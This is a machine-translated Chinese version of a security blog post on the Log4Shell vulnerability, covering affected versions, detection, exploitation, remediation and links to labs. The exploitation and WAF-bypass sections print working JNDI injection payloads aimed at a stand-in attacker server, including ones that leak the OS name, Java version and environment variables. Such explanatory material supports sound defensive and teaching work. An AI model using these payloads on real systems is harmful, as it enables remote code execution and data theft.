# Log4j CVE-2021-44228

> 原文：<https://infosecwriteups.com/log4shell-simplified-all-you-need-to-know-about-cve-2021-44228-3c70d59c307a?source=collection_archive---------2----------------------->

![](img/450bfbc29f791acd51baa866b3d95cf5.png)

凯文的标志

大家好，

自 12 月 9 日以来，该漏洞已被报告在野外被大规模利用。本文只是收集了互联网上可获得的所有必要细节，以了解 **Log4Shell** 漏洞( **CVE-2021-44228** )。

# Log4j 是什么？

Apache Log4j 是一个流行的开源日志记录工具，基于 Java，最初由 Ceki Gülcü编写。它是 Apache 日志服务的一部分，Apache 日志服务是 Apache 软件基金会的一个项目。

# Log4shell 是什么？

Log4Shell 是一个严重的漏洞(**CVE-2021–44228**，CVSSv3 10.0)，它会影响多个版本的 Apache Log4j 2 实用程序。该漏洞允许**未经验证的远程代码执行**。

Log4j2 默认支持名为“[消息查找替换](https://logging.apache.org/log4j/2.x/manual/lookups.html)”的日志记录特性。这个特性使得某些特殊的字符串可以在记录时被其他动态生成的字符串所替换。

Log4j 广泛应用于许多应用程序中，并且作为一个依赖项出现在许多服务中。其中包括企业应用程序和众多云服务。

# 受影响的版本

*   该漏洞由阿里云安全团队的陈兆军发现，影响 Apache Log4j 版本 **2.0 到 2.14.1** 。
*   最初，发布 Log4j 2 . 15 . 0 版是为了修复 CVE-2021–44228。很快，人们发现该补丁不足以抵御某些非默认配置中的攻击。
*   随后发布了 log4j 2 . 16 . 0 版来缓解此漏洞，并针对此漏洞分配了 CVE-2021–45046。

# 脆弱性的影响

由于这个 **Log4j 库**的广泛采用，这个漏洞的影响是巨大的。如果您的环境中有一些 java 应用程序，它们很可能使用 **Log4j** 来记录内部事件。

该漏洞利用也相当灵活，允许您从本地到远程 LDAP 服务器和其他协议检索和执行任意代码。

所有这些因素以及**对如此多系统的高度影响**使得该漏洞的**临界**严重等级为[cvss 3](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2021-44228&vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&version=3.1&source=NIST)10.0。该漏洞正被积极利用的事实进一步增加了受影响组织的风险。

# 识别

在解析日志时，Log4j 检查它接收到的输入，并尝试解析输入中包含的变量。特别是，Log4j 支持 JNDI 查找，这允许通过网络检索变量。为了更好地理解这一点，让我们看看什么是 JNDI。

什么是 JNDI？

> Java 命名和目录接口(Java Naming and Directory Interface，JNDI)为应用程序提供了一个 API，用于与向 RMI 注册表或目录服务(如 LDAP)注册的远程对象进行交互。JNDI 有许多服务提供商接口(SPI ),使其能够使用各种目录服务。

为了识别漏洞，我们需要找出任何可能被记录的字段。例如，任何端点、用户代理、推荐人、你搜索的东西、你以某种形式提交的东西等等。

我们可以用来检测的有效载荷是:
***$ { JNDI:LDAP://XYZ . attack-controlled-server . com/POC }***

如果 collaborator 服务器被阻止，我们还可以使用本主题中提到的不同服务进行检测。

我们也可以使用下面的 **burp 扩展**来自动扫描这个漏洞。

[](https://github.com/0xDexter0us/Log4J-Scanner) [## GitHub—0x dexter 0 us/Log4J-Scanner:扫描 Log4Shell 的 Burp 扩展(CVE-2021–44228)漏洞…

### 使用自定义有效负载扫描 log 4 shell(CVE-2021–44228)漏洞的 Burp 扩展。我不负责你的…

github.com](https://github.com/0xDexter0us/Log4J-Scanner) 

# 剥削

**漏洞利用要求:**

*   具有易受攻击的 log4j 版本的服务器
*   具有任何协议(HTTP、TCP 等)的端点，允许攻击者发送漏洞字符串
*   从该请求中记录字符串的 log 语句。

因此，攻击者所要做的就是找到一些被记录的输入，并添加类似于*$ { JNDI:LDAP://attack-controlled-server/x }*的内容。

让我们看一些剥削的例子

*   获取目标的**操作系统**名称。*$ { JNDI:LDAP://$****{ sys:OS . name }****。*attacker-controlled-server.com/poc*}*
*   识别目标系统上运行的 Java 版本。$*{ JNDI:LDAP://$****{ sys:Java . version }****。*attacker-controlled-server.com/poc*}*
*   对于使用恶意 jar 文件的攻击，请遵循在[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)提供的步骤
*   对于泄漏的服务器端环境变量*$ { JNDI:LDAP://$****{ env:user }****。*attacker-controlled-server.com/poc*}*
*   [log 4 hell 的细胞核模板](https://github.com/danielmofer/nuclei_templates/tree/main/templates)
*   [Log4Shell 打嗝扫描仪](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f)
*   [用于开发的不同有效载荷](https://twitter.com/Rayhan0x01/status/1469571563674505217)

# 酷炫晶圆旁路技巧

要绕过 Web 应用程序防火墙，您可以使用以下有效负载:

```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker-controlled-server.com/poc}${${::-j}ndi:rmi://attacker-controlled-server.com/ass}${jndi:rmi://attacker-controlled-server.com}${${lower:jndi}:${lower:rmi}://attacker-controlled-server.com/poc}${${lower:${lower:jndi}}:${lower:rmi}://attacker-controlled-server.com/poc}${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://attacker-controlled-server.com/poc}${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attacker-controlled-server.com/poc}Working AWS/Cloudfront [#log4j](https://twitter.com/hashtag/log4j?src=hashtag_click) WAF Bypass within the URI path by [@nagli](https://twitter.com/naglinagli/status/1474511213350600707)
http:\/\/hostname.com/${jndi${nagli:-:}ldap:${::-/}/${hostName}.anything.attacker-controlled-server.com/poc}}WAF bypass for log4j injection by [@11xuxx](https://twitter.com/11xuxx/status/1473777341201625088)
${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://attacker-controlled-server.com/poc}Log4j-Payload-Genrator to Bypass WAF
[https://github.com/woodpecker-appstore/log4j-payload-generator](https://github.com/woodpecker-appstore/log4j-payload-generator)
```

# 脆弱的实验室

如果想在本地重现这个漏洞，可以参考 christophetd 的[漏洞 app](https://github.com/christophetd/log4shell-vulnerable-app) 。

[](https://github.com/christophetd/log4shell-vulnerable-app) [## GitHub-Christophe TD/log 4 shell-vulnerable-app:Spring Boot web 应用程序易受…

### 此存储库包含易受 CVE 攻击的 Spring Boot web 应用程序-2021–44228，昵称为 Log4Shell。它使用 Log4j…

github.com](https://github.com/christophetd/log4shell-vulnerable-app) 

log4j RCE 测试环境和概念验证

[](https://github.com/leonjza/log4jpwn) [## GitHub—Leon jza/log 4 jpwn:log4j rce 测试环境和 poc

### log4j rce 测试环境。请参阅:https://www.lunasec.io/docs/blog/log4j-zero-day/此存储库包含一个…

github.com](https://github.com/leonjza/log4jpwn) 

约翰·哈蒙德[准备的“太阳能”试衣间](https://twitter.com/_JohnHammond)

[](https://tryhackme.com/room/solar) [## TryHackMe | Solar，利用 log4j

### 探索 CVE-2021–44228，log4j 中的一个漏洞，它影响了世界上几乎所有的软件。

tryhackme.com](https://tryhackme.com/room/solar) 

# 补救

*   将 log4j 库升级到最新版本。从 log4j 2.17.0 开始，默认情况下已禁用易受攻击的查找行为。
*   如果您无法升级您的库，您可以通过从 Java 类路径中删除类 JndiLookup 来暂时缓解这个漏洞:
    zip -q -d log4j-core-*。jar org/Apache/logging/log4j/core/lookup/jndilookup . class
*   请浏览以下指南以获得详细的 Log4shell 缓解策略
    [指南:如何检测和缓解 Log4shell 漏洞(CVE-2021–44228&CVE-2021–45046)](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)

# 额外资源

*   [如何利用 VMWare vCenter 中的 Log4j 漏洞](https://www.sprocketsecurity.com/blog/how-to-exploit-log4j-vulnerabilities-in-vmware-vcenter)
*   [Frida 脚本修改所有设备特性，以便返回 Log4j 有效负载](https://github.com/Ch0pin/log4JFrida)
*   [Log4j RCE 的扫描仪集合](https://twitter.com/Alra3ees/status/1473535802298839040)
*   [Log4j 对制造商和组件的影响来自互联网社区的总结。](https://github.com/YfryTchsGD/Log4jAttackSurface)
*   [所有已知易受攻击和非易受攻击软件的列表。](https://github.com/NCSC-NL/log4shell/tree/main/software)
*   [CVE 的 Python 实施-2021–42278(活动目录权限提升)](https://github.com/ly4k/Pachine)

# 参考

*   [https://blog . shift left . io/log 4 shell-JNDI-injection-via-attack able-log4j-6 bfea 2b 4896 e](https://blog.shiftleft.io/log4shell-jndi-injection-via-attackable-log4j-6bfea2b4896e)
*   [https://infosecwriteups . com/log 4 shell-zero-day-exploit-full-guide-3a 505 f0c 4248](/log4shell-zero-day-exploit-full-guide-3a505f0c4248)
*   [https://www.lunasec.io/docs/blog/log4j-zero-day/](https://www.lunasec.io/docs/blog/log4j-zero-day/)
*   [https://blog . shift left . io/log 4 shell-Apache-log4j-remote-code-execution-4 f 58 ed 7 e 74 f 9](https://blog.shiftleft.io/log4shell-apache-log4j-remote-code-execution-4f58ed7e74f9)
*   [https://issues.apache.org/jira/browse/LOG4J2-3198](https://issues.apache.org/jira/browse/LOG4J2-3198)
*   [https://github . com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words)
*   [https://github.com/jas502n/Log4j2-CVE-2021-44228](https://github.com/jas502n/Log4j2-CVE-2021-44228)
*   [https://web . archive . org/web/20211211083908/https://github . com/洪飞-cs/JNDIExploit](https://web.archive.org/web/20211211083908/https://github.com/feihong-cs/JNDIExploit)
*   [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
*   [https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/](https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/)
*   https://github.com/authomize/log4j-log4shell-affected

希望你学到了新的东西，喜欢我的博客。保持安全，保持好奇。

感谢阅读！

~Nishith K

在 [Twitter](https://twitter.com/busk3r) 和 [LinkedIn](https://in.linkedin.com/in/nishithkhadadiya) 上与我联系

[](https://twitter.com/busk3r) [## JavaScript 不可用。

### 编辑描述

twitter.com](https://twitter.com/busk3r)  [## 印度古吉拉特邦艾哈迈达巴德|职业简介| LinkedIn

### 查看世界上最大的职业社区 LinkedIn 上 Nishith K 的个人资料。Nishith 有 3 个工作列在他们的…

in.linkedin.com](https://in.linkedin.com/in/nishithkhadadiya)